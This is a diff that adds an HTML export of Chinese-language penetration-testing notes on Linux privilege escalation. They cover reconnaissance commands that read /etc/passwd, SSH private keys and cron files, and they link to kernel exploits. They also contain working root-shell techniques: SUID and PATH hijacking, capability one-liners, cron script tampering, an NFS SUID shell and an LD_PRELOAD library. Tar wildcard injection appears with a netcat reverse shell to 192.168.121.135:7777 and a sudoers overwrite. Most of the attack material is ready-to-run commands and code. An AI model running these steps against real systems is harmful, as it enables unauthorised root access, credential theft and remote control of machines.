@@ -1,0 +1,664 @@
+<!doctype html>
+<html>
+<head>
+<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+<title>系统提权</title>
+</head>
+<body><h2 id='提权基础'>提权基础</h2>
+<p>权限提升在渗透测试中是必不可少的环节，为了得到更高的权限，攻击者可以利用各式各样的工具，漏洞来进行权限的提升</p>
+<h3 id='用户权限'>用户权限</h3>
+<p>在Linux中一个文件有3种权限。对文件而言用户有3种不同类型：文件所有者、群组用户、其他用户。例如：chmod 777中，三个数字7分别对应上面三种用户，权限值都为7。</p>
+<ul>
+<li><p>文件权限：</p>
+<ul>
+<li>r 只读</li>
+<li>w 只写</li>
+<li>x 执行</li>
+
+</ul>
+</li>
+
+</ul>
+<p>高权限可进一步利用的方法：</p>
+<ol start='' >
+<li>重置其他账户密码访问其他账户权限文件</li>
+<li>绕过访问控制的权限操作数据内容</li>
+<li>更改软件的配置</li>
+<li>实现持久化</li>
+<li>更改对应用户权限</li>
+
+</ol>
+<p>提取的大致思路：利用sudo等命令进行提权，利用工具/框架/系统漏洞进行提权</p>
+<h2 id='linux提权'>LINUX提权</h2>
+<h3 id='提权信息的收集'>提权信息的收集</h3>
+<p> 目的在于寻找可以利用的工具，命令，了解版本信息为搜寻系统漏洞做准备</p>
+<h4 id='设备系统信息'>设备，系统信息</h4>
+<pre><code>uname -a    打印所有可用的系统信息
+uname -r    内核版本
+uname -n    系统主机名。
+uname -m    查看系统内核架构（64位/32位）
+hostname    系统主机名
+cat /proc/version    内核信息
+cat /etc/*-release   分发信息
+cat /etc/issue       分发信息
+cat /proc/cpuinfo    CPU信息
+cat /etc/lsb-release # Debian 
+cat /etc/redhat-release # Redhat
+ls /boot | grep vmlinuz-
+</code></pre>
+<h4 id='用户组信息'>用户，组信息</h4>
+<pre><code>cat /etc/passwd     列出系统上的所有用户
+cat /var/mail/root
+cat /var/spool/mail/root
+cat /etc/group      列出系统上的所有组
+grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;      列出所有的超级用户账户
+whoami              查看当前用户
+w                   谁目前已登录，他们正在做什么
+last                最后登录用户的列表
+lastlog             所有用户上次登录的信息
+lastlog –u %username%  有关指定用户上次登录的信息
+lastlog |grep -v &quot;Never&quot;  以前登录用户的完
+</code></pre>
+<p>/etc/passwd信息可用于添加root权限用户进行提权</p>
+<h4 id='用户权限信息'>用户权限信息</h4>
+<pre><code>whoami  当前用户用户名
+id  	当前用户信息
+cat /etc/sudoers  谁被允许以root身份执行
+sudo -l       当前用户可以以root身份执行的操作
+find / -perm -u=s -type f 2&gt;/dev/null   #寻找能以root用户执行的二进制文件
+</code></pre>
+<p>sudo -l命令与find / -perm -u=s -type f 2&gt;/dev/null命令类似，前者需要sudo权限，后者不需要，但是需要find命令存在</p>
+<p>id不能查看自己的信息，以id username 的形式也能看到别人的信息</p>
+<h4 id='系统环境变量信息'>系统环境变量信息</h4>
+<pre><code>env 显示环境变量
+set 现实环境变量
+echo %PATH 路径信息
+history 显示当前用户的历史命令记录
+pwd 输出工作目录
+cat /etc/profile 显示默认系统变量
+cat /etc/shells 显示可用的shell
+</code></pre>
+<h4 id='进程和服务信息'>进程和服务信息</h4>
+<pre><code>ps aux
+ps -ef
+top
+cat /etc/services
+</code></pre>
+<h4 id='服务和插件'>服务和插件</h4>
+<pre><code>cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/
+</code></pre>
+<h4 id='计划任务'>计划任务</h4>
+<pre><code>crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+</code></pre>
+<h4 id='明文密码'>明文密码</h4>
+<pre><code>grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 &quot;password&quot; [filename]
+find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;
+</code></pre>
+<h4 id='ssh私钥信息'>ssh私钥信息</h4>
+<pre><code>cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+</code></pre>
+<h4 id='查看与主机通信的信息'>查看与主机通信的信息</h4>
+<pre><code>lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -anptl
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+</code></pre>
+<ul>
+<li><pre><code>netstat
+</code></pre>
+<p>可以查看现有的连接信息</p>
+<ul>
+<li>利用<code>netstat -at</code>和<code>netstat -au</code>可以分别显示tcp和udp协议的连接</li>
+<li>利用<code>netstat -l</code>可以以<code>Listen</code>列出端口</li>
+
+</ul>
+</li>
+
+</ul>
+<h4 id='查看可提权的suid或guid'>查看可提权的SUID或GUID</h4>
+<pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
+for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
+</code></pre>
+<h4 id='查看可写执行目录'>查看可写/执行目录</h4>
+<pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable folders
+find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders
+find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders
+
+find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders
+
+find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders
+</code></pre>
+<h3 id='提权方法'>提权方法</h3>
+<h4 id='linux内核漏洞提权'>linux内核漏洞提权</h4>
+<p><strong>CVE-2016-5195 脏牛提权漏洞(Dirtycow)</strong></p>
+<p>影响版本： linux kernel &gt;=2.6.22</p>
+<p>漏洞原理：在Linux内核的内存子系统处理私有只读内存映射的写时复制（COW）损坏的方式中发现了一种竞争状况。一个没有特权的本地用户可以使用此漏洞来获取对只读存储器映射的写访问权，从而增加他们在系统上的特权。</p>
+<p>提权利用：</p>
+<ul>
+<li><a href='https://github.com/dirtycow/dirtycow.github.io' target='_blank' class='url'>https://github.com/dirtycow/dirtycow.github.io</a></li>
+<li><a href='https://github.com/gbonacini/CVE-2016-5195' target='_blank' class='url'>https://github.com/gbonacini/CVE-2016-5195</a></li>
+<li><a href='https://github.com/FireFart/dirtycow' target='_blank' class='url'>https://github.com/FireFart/dirtycow</a></li>
+<li><a href='https://github.com/Rvn0xsy/reverse_dirty' target='_blank' class='url'>https://github.com/Rvn0xsy/reverse_dirty</a></li>
+
+</ul>
+<p>exp位置：<a href='https://www.exploit-db.com/exploits/40847' target='_blank' class='url'>https://www.exploit-db.com/exploits/40847</a></p>
+<p><strong>CVE-2019-13272</strong></p>
+<p>影响版本：LINUX 4.10 &lt; 5.1.17</p>
+<ul>
+<li><a href='https://github.com/oneoy/CVE-2019-13272' target='_blank' class='url'>https://github.com/oneoy/CVE-2019-13272</a></li>
+<li><a href='https://github.com/Huandtx/CVE-2019-13272' target='_blank' class='url'>https://github.com/Huandtx/CVE-2019-13272</a></li>
+<li><a href='https://github.com/icecliffs/Linux-For-Root' target='_blank' class='url'>https://github.com/icecliffs/Linux-For-Root</a></li>
+
+</ul>
+<p><strong>CVE-2017-16995</strong></p>
+<ul>
+<li><a href='https://github.com/oneoy/CVE-2019-13272' target='_blank' class='url'>https://github.com/oneoy/CVE-2019-13272</a></li>
+<li><a href='https://github.com/Huandtx/CVE-2019-13272' target='_blank' class='url'>https://github.com/Huandtx/CVE-2019-13272</a></li>
+<li><a href='https://github.com/icecliffs/Linux-For-Root' target='_blank' class='url'>https://github.com/icecliffs/Linux-For-Root</a></li>
+
+</ul>
+<p><strong>CVE-2019-14287</strong></p>
+<ul>
+<li><a href='https://github.com/Twinkeer/CVE' target='_blank' class='url'>https://github.com/Twinkeer/CVE</a></li>
+
+</ul>
+<p><strong>linux内核漏洞提权汇总</strong></p>
+<p><a href='https://github.com/SecWiki/linux-kernel-exploits' target='_blank' class='url'>https://github.com/SecWiki/linux-kernel-exploits</a></p>
+<h4 id='sudo提权'>sudo提权</h4>
+<p>原理：普通用户在使用sudo执行命令的过程中，会暂时拥有root权限，如果该命令执行没有中断，而且该命令运行的过程中可以调用系统命令，那就可以直接运行/bin/bash，此时就是在root权限下运行bash了</p>
+<p>配置文件:sudoers(在该目录中的用户拥有sudo的权限，是否需要输入密码取决于个人设置)</p>
+<pre><code>sudo -l
+</code></pre>
+<p>查询当前用户能够以sudo权限利用的工具，同时可能会遇到连sudo -l都无法执行的情况，这时候就需要考虑其他路线了</p>
+<p>当得到当前用户能够以sudo权限执行的工具时，在<a href='https://gtfobins.github.io/' target='_blank' class='url'>https://gtfobins.github.io/</a>上搜索对应提权命令使用即可</p>
+<p>CVE-2019-14287影响sudo&lt;1.8.23</p>
+<p><strong>su与su -的区别</strong></p>
+<p>su ==&gt;切换到root用户，但shell环境仍然是普通用户的shell</p>
+<p>su - ==&gt;切换到root用户，并且shell环境也一并切换，工作目录为root用户</p>
+<h4 id='suid提权'>SUID提权</h4>
+<p>概念：SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。SUID可以让调用者以文件拥有者的身份运行该文件，通过调用root用户所拥有的suid文件，运行时我们就获得了root权限</p>
+<p><strong>为什么这些文件可以有root权限</strong></p>
+<p>例如ping工具，ping需要发送icmp报文，而发送该报文需要发送Raw Socket，在引入CAPABILITIES之前，该操作需要root权限，所以赋予了普通用户使用ping工具时所需要的root权限，类似的还有exim等</p>
+<p><strong>在本地寻找suid文件</strong></p>
+<pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} ;
+</code></pre>
+<p><strong>常见可用于提权的程序</strong></p>
+<pre><code>nmap vim find Bash More Less Nano cp netcat exim
+</code></pre>
+<p><strong>推荐工具</strong></p>
+<p><a href='https://github.com/Jewel591/suidcheck' target='_blank' class='url'>https://github.com/Jewel591/suidcheck</a></p>
+<p>该工具用于自动寻找可用于suid提权的程序，并给出相应的提权方法与参考文章</p>
+<p><strong>参考链接</strong></p>
+<p><a href='https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html#reply' target='_blank' class='url'>https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html#reply</a></p>
+<h4 id='环境变量提权'>环境变量提权</h4>
+<p>提权的关键在于，寻找到suid权限的脚本文件，环境变量中有自己能够控制的路径，并且脚本中需要有setuid(),setgid()的操作，可以进行一下测试</p>
+<p>当前目录为/home/uu2fu3o/script/</p>
+<p>写两个shell文件</p>
+<pre><code class='language-c' lang='c'>shell1.c
+========
+#include&lt;unistd.h&gt;
+void main()
+{
+ setuid(0);
+ setgid(0);
+ system(&#39;ps&#39;);
+}
+shell2.c
+#include&lt;unistd.c&gt;
+void main()
+{
+    setgid(0);
+    system(&#39;ps&#39;);
+}
+</code></pre>
+<p>分别使用gcc进行编译</p>
+<pre><code>gcc shell1.c -o shell1 
+gcc shell2.c -o shell2
+</code></pre>
+<p>分别赋予两个脚本文件suid权限</p>
+<pre><code>chmod u+s shell1/shell2
+</code></pre>
+<pre><code>cd /tmp
+echo &quot;/bin/bash&quot; &gt; ps
+chmod 777 ps
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/uu2fu3o/script
+./shell
+whoami
+</code></pre>
+<p>通过echo法进行提权，而shell2因为缺少uid的设置无法提权(仅当前测试环境)，除了使用echo方法，还有</p>
+<p>cp法</p>
+<pre><code class='language-shell' lang='shell'>cd /home/uu2fu3o/script/
+cp /bin/sh /tmp/ps
+echo $PATH
+export PATH=/tmp:$PATH
+./shell
+whoami
+</code></pre>
+<p>软连接法</p>
+<pre><code class='language-shell' lang='shell'>ln -s /bin/sh ps
+export PATH=.:$PATH
+./shell
+id
+whoami
+</code></pre>
+<p>注意如果目录具有完全权限，它将成功工作。在 Ubuntu 中，我们在软链接的情况下授予了 /script 目录 777 的权限</p>
+<p>该方法的利用其实也是suid，利用具有suid权限的脚本，自定义当前用户的环境变量来达到提权的目的</p>
+<h4 id='capabilities提权'>Capabilities提权</h4>
+<p>Linux 2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的，在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题</p>
+<p><a href='https://man7.org/linux/man-pages/man7/capabilities.7.html' target='_blank' class='url'>https://man7.org/linux/man-pages/man7/capabilities.7.html</a>中有对权限分类的详细介绍</p>
+<p>关于机制：在进行特权操作时，如果euid不是root,就会检查进程是否有对应的capabilities，并根据结果是否执行对应的操作，</p>
+<p>capabilities细分到线程，每个线程可以有不同的capabilities，除了对线程的capabilities有相关功能外，还对具有对文件的附加属性进行设置，使得文件具有一定的capabilities，但是需要注意的是</p>
+<pre><code>文件cap_setuid的capabilities和文件的suid标志位之间是没有关系的：
+设置了cap_setuid的capability的文件并没有设置suid。
+设置了suid的程序也不拥有cap_setuid的capability。
+</code></pre>
+<p>关于详细的介绍和理解可以看这篇文章<a href='https://www.cnblogs.com/f-carey/p/16026088.html#tid-5fzNyS' target='_blank' class='url'>https://www.cnblogs.com/f-carey/p/16026088.html#tid-5fzNyS</a>。这里仅介绍一些基本命令以及如何使用该属性进行提权</p>
+<pre><code>getcap /bin/ping #获取ping命令的capabilities
+setcap cap_net_raw,cap_net_admin=eip /bin/ping  #添加capabilities
+setcap -r /bin/ping #删除文件的capabilities
+</code></pre>
+<p><strong>利用capabilities实现权限提升</strong></p>
+<p>查找设置了capabilities的可执行文件</p>
+<pre><code class='language-sehll' lang='sehll'>getcap -r / 2&gt;/dev/null
+</code></pre>
+<pre><code class='language-shell' lang='shell'>#python
+python -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;
+#php
+php -r &quot;posix_setuid(0); system(&#39;/bin/sh&#39;);&quot;
+#perl
+perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;
+#gdb
+gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit
+</code></pre>
+<p>更多的命令可以在<a href='https://gtfobins.github.io/' target='_blank' class='url'>https://gtfobins.github.io/</a>自行寻找</p>
+<h4 id='定时任务提权'>定时任务提权</h4>
+<p>定时任务通常被设置用于备份文件、清理目录内容等。crontab命令可以创建一个cron文件，以指定的时间区间运行。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p>
+<p>假设我们已经进入目标机器，并尝试定时任务提权(仅演示ubuntu)</p>
+<pre><code>cat /etc/crontab
+</code></pre>
+<p>寻找可以利用的脚本，该脚本需要可读可写可更改</p>
+<p>更改脚本内容来实现提权，例如将下述代码插入到python脚本中，等待执行该脚本后执行/bin/dash提权</p>
+<pre><code>os.system(&#39;chmod u+s /bin/dash&#39;)
+</code></pre>
+<p>如果目标机器的CronJob存在，但文件已被删除，并且未定义脚本的完整路径，cron 将引用 /etc/crontab 文件中 PATH 变量下列出的路径。可以被当前用户利用。</p>
+<p><strong>问1：</strong>ubuntu和centos的定时任务有什么区别</p>
+<p>Ubuntu和CentOS都支持使用cron定时任务来自动执行指定的命令或脚本。它们在默认设置和配置方面存在一些区别。</p>
+<ol start='' >
+<li>工具名称和路径：在Ubuntu中，cron守护程序的名称是cron，而在CentOS中，它是crond。此外，在Ubuntu中，cron配置文件的路径是/etc/crontab和/etc/cron.d/，而在CentOS中，cron配置文件的路径是/etc/crontab和/etc/cron.d/，但是crontab文件的路径是/var/spool/cron/。</li>
+<li>默认配置：在Ubuntu中，cron守护程序默认启用了用户级别的crontab文件（通过crontab -e命令创建），而在CentOS中，默认情况下只启用了系统级别的crontab文件（通过在/etc/crontab和/etc/cron.d/目录中创建文件来添加任务）。</li>
+<li>用户限制：在Ubuntu和CentOS中，系统管理员可以通过配置/etc/cron.allow和/etc/cron.deny文件来限制哪些用户可以使用cron。Ubuntu默认情况下启用了cron.allow文件，而CentOS默认情况下启用了cron.deny文件。</li>
+<li>日志文件：在Ubuntu和CentOS中，cron守护程序的日志文件路径都是/var/log/cron.log。但是，在CentOS中，默认情况下cron日志并不会记录到日志文件中，需要手动配置日志记录功能。</li>
+
+</ol>
+<p><strong>问2：</strong>centos的定时任务文件树是怎样的</p>
+<p>CentOS 的定时任务文件树通常位于 /etc/cron.d/ 和 /var/spool/cron/目录下。</p>
+<ol start='' >
+<li>/etc/cron.d/：在这个目录下，系统管理员可以创建任意数量的 cron 文件，每个文件都包含多个 cron 任务。文件名可以是任意的，但通常使用描述性的名称（如 apache、mysql 等）以便于管理。每个文件的格式与 /etc/crontab文件相同，它们由五个时间字段和一个要执行的命令组成。</li>
+<li>/var/spool/cron/：在这个目录下，用户可以创建他们自己的 cron 任务。每个用户都有一个以其用户名命名的文件，其中包含该用户的 cron 任务。用户可通过运行 crontab -e命令来编辑其 cron 文件。每个文件的格式与etc/crontab文件相同，它们由五个时间字段和一个要执行的命令组成。</li>
+
+</ol>
+<h4 id='nfs提权'>NFS提权</h4>
+<p><strong>什么是NFS</strong></p>
+<p>网络文件系统（<strong>NFS</strong>）是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在  <strong>NFS</strong>  协议是几个分布式文件系统标准，网络附加存储（NAS）之一。</p>
+<p>NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了<a href='https://cloud.tencent.com/solution/xdr?from_column=20420&amp;from=20420'>XDR</a>的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p>
+<p><strong>利用条件</strong></p>
+<p>no_root_squash选项开启</p>
+<p><strong>no_root_squash和root_squash的区别</strong></p>
+<p>root_squash表示将 root 用户的权限限制为普通用户，即将 root 用户的操作权限降低到与普通用户相同的级别。这个选项会将 NFS 客户端上的 root 用户的操作权限映射为匿名用户或者指定的非特权用户;而no_root_squash正好相反，NFS客户端上的root用户拥有完整的root权限</p>
+<p><strong>利用nfs</strong></p>
+<p>1.识别nfs共享，可通过nmap或rpcinfo等工具</p>
+<pre><code>nmap -sV -p 111,2049 IP
+#nmap扫描nfs的常用端口111和2049
+rpcinfo -p IP
+#rpcinfo直接枚举nfs
+</code></pre>
+<p>2.检查开启的nsf共享目录和<code>no_root_squash</code>选项设置</p>
+<pre><code>cat /etc/exports
+</code></pre>
+<p>该文件每一行都由如下格式构成</p>
+<p>[共享的目录] [主机名或IP(参数,参数)]</p>
+<p>也可以是用showmount进行查看</p>
+<pre><code class='language-shell' lang='shell'>showmount命令用于查询NFS服务器的相关信息
+# showmount --help
+ Usage: showmount [-adehv]
+        [--all] [--directories] [--exports]
+        [--no-headers] [--help] [--version] [host]
+-a或--all
+    以 host:dir 这样的格式来显示客户主机名和挂载点目录。
+ -d或--directories
+    仅显示被客户挂载的目录名。
+ -e或--exports
+    显示NFS服务器的输出清单。
+ -h或--help
+    显示帮助信息。
+ -v或--version
+    显示版本信。
+ --no-headers
+    禁止输出描述头部信息。
+
+显示NFS客户端信息
+ # showmount
+
+显示指定NFS服务器连接NFS客户端的信息
+ # showmount ip  #此ip为nfs服务器的
+
+显示输出目录列表
+ # showmount -e
+
+显示指定NFS服务器输出目录列表（也称为共享目录列表）
+ # showmount -e ip
+
+显示被挂载的共享目录
+ # showmount -d
+
+显示客户端信息和共享目录
+ # showmount -a
+
+显示指定NFS服务器的客户端信息和共享目录
+# showmount -a ip
+</code></pre>
+<p>使用msf同样</p>
+<pre><code>msf &gt; use auxiliary/scanner/nfs/nfsmount
+msf auxiliary(nfsmount) &gt; set rhosts IP
+msf auxiliary(nfsmount) &gt; run
+</code></pre>
+<p>/cat/exports中存在以下内容</p>
+<pre><code>└─# cat /etc/exports                                              
+/tmp *(rw,sync,no_root_squash,no_subtree_check)
+</code></pre>
+<p>说明tmp目录存在我们需要的参数，并且能够远程挂载</p>
+<p>3.创建目录远程挂载系统</p>
+<pre><code>mkdir /tmp/test
+mount -o rw，vers = 2 [目标ip]：/tmp /tmp/test
+</code></pre>
+<p>在/tmp/test中创建C文件</p>
+<pre><code class='language-c' lang='c'>#include&lt;unistd.h&gt;
+void main()
+{
+        setuid(0);
+        setgid(0);
+        system(&quot;/bin/bash&quot;);
+}
+</code></pre>
+<p>编译</p>
+<pre><code>gcc /tmp/test/suid-shell.c -o suid-shell
+</code></pre>
+<p>赋权</p>
+<pre><code>chmod +s suid-shell
+</code></pre>
+<p>回到目标机器上执行编译后的脚本,即可获得root权限，也可以利用其它类型的脚本，例如python,取决与目标机器上有什么服务</p>
+<pre><code class='language-python' lang='python'>/usr/bin/python3
+
+import os
+import sys
+
+try: 
+        os.system(&quot;/bin/bash&quot;)
+except:
+        sys.exit()
+</code></pre>
+<h4 id='通配符提权'>通配符提权</h4>
+<h5 id='常见的通配符介绍'>常见的通配符介绍</h5>
+<pre><code>*  代表任意多个字符
+?  代表任意单个字符
+[ ] 代表“[”和“]”之间的某一个字符，比如[0-9]可以代表0-9之间的任意一个数字，[a-zA-Z]可以代表a-z和A-Z之间的任意一个字母，字母区分大小写。
+– 代表一个字符。
+~ 用户的根目录。
+</code></pre>
+<h5 id='wildcard-wildness通配符在野）'>Wildcard wildness（通配符在野）</h5>
+<p>来看一个简单的实验</p>
+<pre><code>echo &quot;testtest123&quot;&gt;file1
+echo &quot;take help&quot;&gt; --help
+ls 
+==&gt; file1 --help
+</code></pre>
+<p>接下来cat这两个文件</p>
+<pre><code>┌──(root㉿kali)-[~/Desktop]
+└─# cat file1 
+testtest123
+┌──(root㉿kali)-[~/Desktop]
+└─# cat --help
+Usage: cat [OPTION]... [FILE]...
+Concatenate FILE(s) to standard output.
+</code></pre>
+<p>当我们cat --help缺调用出了cat自身的帮助选择项，这被称之为通配符在野,利用这个操作我们干很多事情</p>
+<p><strong>通过chown劫持文件所有者</strong></p>
+<p>假设有几个php文件在当前目录下，但拥有者并不是我们自己，首先创建属于自己的php文件，假设为my.php,继续执行如下命令</p>
+<pre><code>echo &gt; --reference=my.php
+</code></pre>
+<p>会生成名为--reference=my.php的文件，此时如果root用户修改php文件的权限给另一个用户</p>
+<pre><code>chown -R another_user:another_user *.php
+</code></pre>
+<p>我们就能从中劫持php文件的所有权，--reference作为chown命令的一个选项，用于引用某个文件的属性来替换自己的元数据</p>
+<pre><code>–reference=RFILE（直接引用某个文件的属性来替换自己的元数据）
+</code></pre>
+<p>当root用户修改权限时，主观地调用了chown ........... -reference=my.php文件，导致数据被我们的文件属性劫持，达到替换的目的</p>
+<p><strong>Tar通配符注入</strong></p>
+<p>lab setup</p>
+<pre><code>mkdir html
+chmod 777 html
+cd html
+touch index.html
+touch test
+touch file.txt
+</code></pre>
+<p>随后在定时任务中写入</p>
+<pre><code>*/1 *  * * *   root tar -zcf /var/www/html.tgz /var/www/html/*
+</code></pre>
+<p>每分钟备份一次html目录下的文件</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\labsetup.png" referrerpolicy="no-referrer" alt="labsetup"></p>
+<p><strong>方法1</strong></p>
+<p>使用msf生成一句话反向shell</p>
+<pre><code>msfvenom -p cmd/unix/reverse_netcat lhost=192.168.121.135 lport=7777 R
+=&gt;
+mkfifo /tmp/rtmmiv; nc 192.168.121.135 7777 0&lt;/tmp/rtmmiv | /bin/sh &gt;/tmp/rtmmiv 2&gt;&amp;1; rm /tmp/rtmmiv
+</code></pre>
+<p>随后在受害者机器执行</p>
+<pre><code>echo &quot;mkfifo /tmp/rtmmiv; nc 192.168.121.135 7777 0&lt;/tmp/rtmmiv | /bin/sh &gt;/tmp/rtmmiv 2&gt;&amp;1; rm /tmp/rtmmiv&quot; &gt; shell.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+tar cf archive.tar *
+</code></pre>
+<p>即可在攻击机上得到反向shell</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\tarshell.png" referrerpolicy="no-referrer" alt="tarshell"></p>
+<p>上述命令，首先将反向shell代码写入名为shell.sh的文件，创建名为--checkpoint-action=exec=sh shell.sh和--checkpoint=1的文件，最后将这些文件进行压缩时，调用这两个选项执行shell脚本达到反向shell的目的，并且由于定身任务中tar操作由root用户进行，我们能得到rootshell，但是这里不知道为什么复现失败了，原文是在tmp目录下进行的，不清楚问题原因，但是大致有以下条件</p>
+<pre><code>1.打包目录html需要其他用户拥有执行+写权限。
+2.目标Linux上有安装nc软件。
+3.tar打包执行反弹命令时，”tar cf archive.tar *“命令需要进入/var/www/html目录执行
+</code></pre>
+<p>除了上述方法还可以使用sudoer</p>
+<pre><code class='language-shell' lang='shell'>echo &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt; demo.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh demo.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+tar cf archive.tar *
+</code></pre>
+<p>为任意的系统二进制文件启用suid，并使用suid进行提权</p>
+<pre><code class='language-shell' lang='shell'>echo &quot;chmod u+s /usr/bin/find&quot; &gt; test.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+tar cf archive.tar *
+ls -al /usr/bin/find
+find f1 -exec &quot;whoami&quot; \;
+root
+find f1 -exec &quot;/bin/sh&quot; \;
+id
+whoami
+</code></pre>
+<h4 id='共享库提权'>共享库提权</h4>
+<p>Linux 程序通常使用动态链接的共享对象库,有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的<code>-rpath</code>or<code>-rpath-link</code>标志，使用环境变量<code>LD_RUN_PATH</code>or <code>LD_LIBRARY_PATH</code>，将库放置在<code>/lib</code>or<code>/usr/lib</code>默认目录中，或者在<code>/etc/ld.so.conf</code>配置文件中指定包含库的另一个目录。<code>LD_PRELOAD</code>环境变量可以在执行二进制文件之前加载库。此库中的函数优先于默认函数。</p>
+<p><strong>提权条件</strong></p>
+<p>所用的命令需要有较高的权限，/etc/sudoers<code>文件中需要定义</code>env_keep+=LD_PRELOAD，我们能够编写恶意库文件</p>
+<p><strong>利用</strong></p>
+<pre><code class='language-c' lang='c'>#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+unsetenv(&quot;LD_PRELOAD&quot;);
+setgid(0);
+setuid(0);
+system(&quot;/bin/bash&quot;);
+}
+</code></pre>
+<p>上述脚本命名为shell.c，编译为shell.so的动态文件</p>
+<pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+随后指定LD_PRELOAD执行find命令
+sudo  LD_PRELOAD=/tmp/test/shell.so find  //换成自己的路径即可
+</code></pre>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\ld_preload.png" referrerpolicy="no-referrer" alt="ld_preload"></p>
+<p>即可成功提权，但是经过测试，该方法受sudo的限制</p>
+<h4 id='共享对象劫持提权linux利用动态链接共享对象库提权'>共享对象劫持提权(Linux利用动态链接共享对象库提权)</h4>
+<p>不同于共享库提权的是，针对于新开发的程序和可执行的二进制文件</p>
+<p><strong>操作系统如何寻找共享库</strong></p>
+<pre><code>任何由rpath-link选项指定的目录（由rpath-link选项指定的目录仅在链接时有效）
+任何由rpath选项指定的目录（rpath选项指定的目录都包含在可执行文件中，并在运行时使用）
+LD_RUN_PATH
+LD_LIBRARY_PATH
+DT_RUNPATH或DT_RPATH中的目录。（如果存在DT_RUNPATH条目，则忽略DT_RPATH条目）
